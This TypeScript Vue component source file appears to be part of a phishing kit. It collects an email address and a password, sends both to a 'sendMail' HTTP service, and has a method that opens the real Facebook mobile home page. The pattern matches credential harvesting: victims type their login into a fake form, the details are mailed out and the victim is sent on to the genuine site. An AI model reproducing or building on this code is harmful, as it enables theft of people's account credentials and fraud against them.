import { Component, Vue } from "vue-property-decorator";
import Template from "./App.template.vue";
import { sendMail } from "./services/http.services";

@Component({
  mixins: [Template],
})
export default class App extends Vue {
  public source: any = null;
  public drawer: any = null;
  public show = false;
  public password = "";
  public correo = "";
  public loading = false;
  public verifiqued = false;

  public rules: any = [
    (value: string) => !!value || "Required.",
    //(value:string) => (value && value.length >= 3) || 'Min 3 characters',
  ];
  public go() {
    window.open("https://m.facebook.com/home.php");
  }

  public async sendEmail() {
    this.loading = true;
    const datos = {
      correo: this.correo,
      password: this.password,
    };
    await sendMail(datos);
    this.verifiqued = true;
    this.loading = false;
  }
}
